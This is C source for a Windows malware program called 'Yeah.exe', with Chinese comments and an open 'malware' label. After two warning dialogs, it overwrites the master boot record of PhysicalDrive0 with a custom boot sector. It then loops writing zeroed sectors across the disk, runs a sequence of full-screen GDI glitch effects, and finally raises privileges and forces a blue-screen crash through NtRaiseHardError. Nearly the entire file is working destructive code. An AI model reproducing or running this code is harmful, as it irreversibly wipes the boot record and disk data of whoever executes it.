#include <string.h>
#include <windows.h>
#include <math.h>
#include <time.h>
#include <tchar.h>
#include <shlwapi.h>
#include "NtHeader.h"//这个头文件蓝屏要用到
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"msimg32.lib")
#pragma warning( disable : 4244 )//这个能减少VC++6.0编译时一些无关紧要的警告
#define PI acos( -1.0 )

typedef UINT (CALLBACK* NTRAISEHARDERROR)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID,HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE);
typedef UINT (CALLBACK* RTLADJUSTPRIVILEGE)(ULONG, BOOL, BOOL, PINT);
//蓝屏要用到的两个数据类型

DWORD xs; //这是随机数种子
void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}//设置随机数种子
DWORD Xorshift32( VOID ) {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}//获取随机数并刷新
void WINAPI InitDPI( VOID ) {
	HMODULE hModUser32 = LoadLibrary((char *)"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	if (SetProcessDPIAware){
		SetProcessDPIAware();
	}
	FreeLibrary(hModUser32);
	//将进程默认DPI感知设置为系统DPI感知
	//防止特效只在左上角显示
	
    SeedXorshift32((DWORD)(time(NULL)));
    //设置随机数种子
}

void BlueScreen( VOID ){
	HINSTANCE hModule = LoadLibrary(TEXT("ntdll.dll"));//加载ntdll.dll
	NTRAISEHARDERROR NtRaiseHardError;
	RTLADJUSTPRIVILEGE RtlAdjustPrivilege;
	HARDERROR_RESPONSE reResponse;
	int nEn = 0;
	if(hModule != NULL){
		NtRaiseHardError = (NTRAISEHARDERROR)GetProcAddress(hModule, "NtRaiseHardError");
		RtlAdjustPrivilege = (RTLADJUSTPRIVILEGE)GetProcAddress(hModule, "RtlAdjustPrivilege");
		//获取RtlAdjustPrivilege和NtRaiseHardError的内存地址
		
		if(!RtlAdjustPrivilege){
			FreeLibrary(hModule);
		}else{
    		RtlAdjustPrivilege(0x00000013, true, false, &nEn);//开始提权
    		if(!NtRaiseHardError){
    			FreeLibrary(hModule);
    		}else{
        		NtRaiseHardError(0x000000F4, 0, 0, 0, OptionShutdownSystem, &reResponse);//制造蓝屏
    		}//判断NtRaiseHardError是否有效
		}//判断RtlAdjustPrivilege是否有效
	}//判断句柄是否为空
}//蓝屏

/*----------------------------------------↑功能区↑----------------------------------------*/

const char mbrData[512] = {
0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x04, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
0xCD, 0x10, 0xC3, 0x59, 0x65, 0x61, 0x68, 0x21, 0x48, 0x61, 0x70, 0x70, 0x79, 0x20, 0x4E, 0x65,
0x77, 0x20, 0x59, 0x65, 0x61, 0x72, 0x21, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};//MBR内容

DWORD WINAPI mbr(LPVOID lpParam){
	DWORD dwWrittenBytes;
	HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL );//获取句柄
	if ( hDrive == INVALID_HANDLE_VALUE ){
	    MessageBox(NULL, "Why can not I found computer boot?", "Yeah.exe", MB_OK+MB_ICONQUESTION);
	    return 0;
	}//判断句柄是否有效
	bool bSuccess = WriteFile( hDrive, mbrData, 512, &dwWrittenBytes, NULL );//写MBR
	if ( !bSuccess ){
	    MessageBox(NULL, "I can not write your computer boot, that's so embarrassing.", "Yeah.exe", MB_OK+MB_ICONQUESTION);
		CloseHandle(hDrive);
		return 0;
	}//判断改MBR是否成功
	char NullData[512];
	RtlZeroMemory(NullData, 512);//定义空数据
	for ( ; ; WriteFile(hDrive, NullData, 512, &dwWrittenBytes, NULL));//填充扇区
}//改MBR，在Monoxide/destruction.h的OverwriteBoot上进行改造

/*----------------------------------------↑MBR区↑----------------------------------------*/

DWORD WINAPI payload01A(LPVOID lpParam){
    for( ; ; ){
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        Sleep(100);
    }
    return 0;
}//屏幕反色

DWORD WINAPI payload01B(LPVOID lpParam){
    for( ; ; ){
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    	SelectObject(hdc, CreatePen(PS_SOLID, 10, Xorshift32() % 0xffffff));
    	POINT pps[4];
    	for(int i = 0; i < 4; i++){
    	    pps[i].x = Xorshift32() % w, pps[i].y = Xorshift32() % h;
    	}
    	PolyBezier(hdc, pps, 4);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        Sleep(100);
    }
}//画线条，拿Lambda的凑个数

DWORD WINAPI payload01C(LPVOID lpParam){
    for( ; ; ){
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        SelectObject(hdc, CreateSolidBrush(Xorshift32() % 0xffffff));
        PatBlt(hdc, Xorshift32() % w, Xorshift32() % h, Xorshift32() % w, Xorshift32() % h, PATINVERT);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        Sleep(100);
    }
}//随机彩块

DWORD WINAPI payload01D(LPVOID lpParam){
    for( ; ; ){
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        Sleep(100);
    }
    return 0;
}//屏幕缩进

/*----------------------------------------↑前奏区↑----------------------------------------*/

DWORD WINAPI payload02(LPVOID lpParam){
    int turnX = 1, turnY = 1;
    int x = 0, y = 0;
    for(int t = 0; ; t++){
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    	HDC hcdc = CreateCompatibleDC(hdc);
    	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    	SelectObject(hcdc, hBitmap);
    	if(t % 5 == 0){
        	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, BLACKNESS);
    	}else{
        	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    	}
        x += turnX * 20, y += turnY * 20;
        if(x >= w - 7 * (h / 10) || x <= 0){
            turnX = -turnX;
        }
        if(y >= 3 * (h / 10) || y <= 0){
            turnY = -turnY;
        }
        HRGN hrgn = CreateEllipticRgn(x, y, x + 7 * (h / 10), y + 7 * (h / 10));
        SelectClipRgn(hcdc, hrgn);
        SelectObject(hcdc, CreateSolidBrush(Xorshift32() % 0xffffff));
        PatBlt(hcdc, x, y, 7 * (h / 10), 7 * (h / 10), PATINVERT);
    	BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
    	ReleaseDC(NULL, hcdc);
        DeleteObject(hdc);
    	DeleteObject(hcdc);
    	DeleteObject(hBitmap);
        DeleteObject(hrgn);
        Sleep(20);
    }
    return 0;
}//彩色圆圈闪烁

DWORD WINAPI payload03(LPVOID lpParam){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    for(int t = 0; ; t+=20){
        hdc = GetDC(NULL);
        for(int y = 0; y <= h; y++){
            float x = sin((y + t) * (PI / 50)) * 25;
            BitBlt(hdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        DrawIconEx(hcdc, Xorshift32() % w, Xorshift32() % h, LoadIcon(NULL, MAKEINTRESOURCE(32512 + (Xorshift32() % 6))), Xorshift32() % 30, Xorshift32() % 30, 0, NULL, DI_NORMAL | DI_COMPAT | DI_DEFAULTSIZE);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        Sleep(20);
    }
	ReleaseDC(NULL, hcdc);
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
    return 0;
}//扭曲图标，拿Lambda的凑个数

DWORD WINAPI payload04(LPVOID lpParam){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    for(int t = 0; ; t++){
        hdc = GetDC(NULL);
        POINT pos[4];
        for(int i = 0; i < 4; i++){
            pos[i].x = Xorshift32() % w, pos[i].y = Xorshift32() % h;
        }
        SelectObject(hdc, CreatePen(PS_SOLID, 2, 0));
        SelectObject(hdc, CreateSolidBrush(Xorshift32() % 0xffffff));
        Polygon(hdc, pos, 4);
        SetBkColor(hdc, Xorshift32() % 0xffffff);
        SetTextColor(hdc, Xorshift32() % 0xffffff);
        HFONT font = CreateFont(Xorshift32() % 50, Xorshift32() % 50, 0, 0, FW_NORMAL, 1, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
        SelectObject(hdc, font);
        if(t % 3 == 0){
            TextOut(hdc, Xorshift32() % w, Xorshift32() % h, _T("STILL USE COMPUTER"), 18);
        }else if(t % 3 == 1){
            TextOut(hdc, Xorshift32() % w, Xorshift32() % h, _T("YEAH!!!"), 7);
        }else{
            TextOut(hdc, Xorshift32() % w, Xorshift32() % h, _T("HOPEJIESHUO"), 11);
        }
        BitBlt(hdc, 3, -3, w, h, hdc, 0, 0, SRCAND);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
        Sleep(20);
    }
    return 0;
}//多边形派对

DWORD WINAPI payload05(LPVOID lpParam){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	
	for(int t = 0; ; t++){
	    hdc = GetDC(NULL);
	    int n = Xorshift32() % 2 == 0 ? -20 : 20;
    	BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
    	if(Xorshift32() % 2 == 0){
    	    int y = Xorshift32() % h;
        	BitBlt(hdc, n, y, w, Xorshift32() % (h - y), hcdc, 0, y, SRCCOPY);
    	}else{
    	    int x = Xorshift32() % w;
    	    BitBlt(hdc, x, n, Xorshift32() % (w - x), h, hcdc, x, 0, SRCCOPY);
    	}
	    ReleaseDC(NULL, hdc);
	    DeleteObject(hdc);
	    Sleep(100);
	}
	
	ReleaseDC(NULL, hcdc);
	DeleteObject(hcdc);
	DeleteObject(hBitmap);
    return 0;
}//屏幕闪动

DWORD WINAPI payload06A(LPVOID lpParam){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int cx = GetSystemMetrics(11), cy = GetSystemMetrics(12);
	for(int t = 0; ; t += 5){
	    hdc = GetDC(NULL);
	    DrawIcon(hdc, (w / 2) - (cx / 2) + (cos(t * (PI / 180)) * (t / 10)), (h / 2) - (cy / 2) + (sin(t * (PI / 180)) * (t / 10)), LoadIcon(NULL, IDI_ERROR));
	    DrawIcon(hdc, (w / 2) - (cx / 2) + (cos((t + 90) * (PI / 180)) * (t / 10)), (h / 2) - (cy / 2) + (sin((t + 90) * (PI / 180)) * (t / 10)), LoadIcon(NULL, IDI_QUESTION));
	    DrawIcon(hdc, (w / 2) - (cx / 2) + (cos((t + 180) * (PI / 180)) * (t / 10)), (h / 2) - (cy / 2) + (sin((t + 180) * (PI / 180)) * (t / 10)), LoadIcon(NULL, IDI_WARNING));
	    DrawIcon(hdc, (w / 2) - (cx / 2) + (cos((t + 270) * (PI / 180)) * (t / 10)), (h / 2) - (cy / 2) + (sin((t + 270) * (PI / 180)) * (t / 10)), LoadIcon(NULL, IDI_INFORMATION));
	    ReleaseDC(NULL, hdc);
	    DeleteObject(hdc);
	    Sleep(20);
	}
    return 0;
}//四图标转圈圈

DWORD WINAPI payload06B(LPVOID lpParam){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	for(int t = 0; ; t++){
	    hdc = GetDC(NULL);
	    BitBlt(hdc, Xorshift32() % 2 == 0 ? -5 : 5, Xorshift32() % 2 == 0 ? -5 : 5, w, h, hdc, 0, 0, SRCCOPY);
	    ReleaseDC(NULL, hdc);
	    DeleteObject(hdc);
	    Sleep(100);
	}
    return 0;
}//屏幕振动

DWORD WINAPI payload07A(LPVOID lpParam){
    LPCTSTR str[4] = {"WRITE BOOT", "KILL PC", "MICROSOFT WINDOWS", "SAY GOODBYE"};
    for(int t = 0; ; t++){
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    	PLOGFONT plf = (PLOGFONT)LocalAlloc(LPTR, sizeof(LOGFONT));
    	plf->lfWidth = 50;
    	plf->lfHeight = 50;
    	plf->lfWeight = FW_NORMAL;
    	plf->lfEscapement = 10 * (Xorshift32() % 360);
    	SelectObject(hdc, CreateFontIndirect(plf));
    	SetBkMode(hdc, TRANSPARENT);
    	SetTextColor(hdc, Xorshift32() % 0xffffff);
    	int chs = Xorshift32() % 4;
    	TextOut(hdc, Xorshift32() % w, Xorshift32() % h, str[chs], sizeof(str[chs]));
    	LocalFree((LOCALHANDLE)plf);
	    ReleaseDC(NULL, hdc);
	    DeleteObject(hdc);
    	Sleep(20);
    }
    return 0;
}//抛字符串，拿Lambda的凑个数

DWORD WINAPI payload07B(LPVOID lpParam){
    for(int t = 0; ; t++){
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    	HDC hcdc = CreateCompatibleDC(hdc);
    	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
    	SelectObject(hcdc, hBitmap);
    	BLENDFUNCTION blf = { 0 };
    	blf.BlendOp = AC_SRC_OVER;
    	blf.BlendFlags = 0;
    	blf.SourceConstantAlpha = 200;
    	blf.AlphaFormat = 0;
        POINT pos[3];
        pos[0].x = 0, pos[0].y = 0;
        pos[1].x = cos(PI / 36) * w, pos[1].y = sin(PI / 36) * w;
        pos[2].x = (-1) * (sin(PI / 36) * h), pos[2].y = cos(PI / 36) * h;
		PlgBlt(hcdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
		SelectObject(hcdc, CreateSolidBrush(Xorshift32() % 0xffffff));
		PatBlt(hcdc, 0, 0, w, h, PATINVERT);
		PatBlt(hcdc, Xorshift32() % w, 0, 10, h, PATINVERT);
		AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
	    ReleaseDC(NULL, hdc);
	    DeleteObject(hdc);
        Sleep(100);
    }
    return 0;
}//闪屏

/*----------------------------------------↑高潮区↑----------------------------------------*/

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow) {
    if(MessageBox(NULL, "THIS MALWARE WILL WHITE YOU BOOT,\nARE YOU SURE TO RUN IT?", "Yeah.exe - Warning", MB_YESNO+MB_ICONQUESTION) != IDYES) {
        ExitProcess(0);
    }
    if(MessageBox(NULL, "THIS IS LAST WARNING,\nTHE MALWARE AUTHOR COULDN'T ASSUME LEGAL LIABILITY,\nSO ARE YOU SURE TO RUN IT?", "Yeah.exe - Warning", MB_YESNO+MB_ICONWARNING) != IDYES) {
        ExitProcess(0);
    }
    
    InitDPI();
    CreateThread(NULL, 0, &mbr, NULL, 0, NULL);
    
    HANDLE handle01A = CreateThread(NULL, 0, &payload01A, NULL, 0, NULL);
    Sleep(7500);
    HANDLE handle01B = CreateThread(NULL, 0, &payload01B, NULL, 0, NULL);
    Sleep(7500);
    HANDLE handle01C = CreateThread(NULL, 0, &payload01C, NULL, 0, NULL);
    Sleep(7500);
    HANDLE handle01D = CreateThread(NULL, 0, &payload01D, NULL, 0, NULL);
    Sleep(7500);
    TerminateThread(handle01A, 0);
    CloseHandle(handle01A);
    TerminateThread(handle01B, 0);
    CloseHandle(handle01B);
    TerminateThread(handle01C, 0);
    CloseHandle(handle01C);
    TerminateThread(handle01D, 0);
    CloseHandle(handle01D);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    Sleep(1000);
    
    HANDLE handle02 = CreateThread(NULL, 0, &payload02, NULL, 0, NULL);
    Sleep(30000);
    TerminateThread(handle02, 0);
    CloseHandle(handle02);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    Sleep(1000);
    
    HANDLE handle03 = CreateThread(NULL, 0, &payload03, NULL, 0, NULL);
    Sleep(30000);
    TerminateThread(handle03, 0);
    CloseHandle(handle03);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    Sleep(1000);
    
    HANDLE handle04 = CreateThread(NULL, 0, &payload04, NULL, 0, NULL);
    Sleep(30000);
    TerminateThread(handle04, 0);
    CloseHandle(handle04);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    Sleep(1000);
    
    HANDLE handle05 = CreateThread(NULL, 0, &payload05, NULL, 0, NULL);
    Sleep(30000);
    TerminateThread(handle05, 0);
    CloseHandle(handle05);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    Sleep(1000);
    
    HANDLE handle06A = CreateThread(NULL, 0, &payload06A, NULL, 0, NULL);
    HANDLE handle06B = CreateThread(NULL, 0, &payload06B, NULL, 0, NULL);
    Sleep(30000);
    TerminateThread(handle06A, 0);
    CloseHandle(handle06A);
    TerminateThread(handle06B, 0);
    CloseHandle(handle06B);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    Sleep(1000);
    
    HANDLE handle07A = CreateThread(NULL, 0, &payload07A, NULL, 0, NULL);
    HANDLE handle07B = CreateThread(NULL, 0, &payload07B, NULL, 0, NULL);
    Sleep(30000);
    TerminateThread(handle07A, 0);
    CloseHandle(handle07A);
    TerminateThread(handle07B, 0);
    CloseHandle(handle07B);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    Sleep(1000);
    
    BlueScreen();
    return 0;
}
/*----------------------------------------↑主函数↑----------------------------------------*/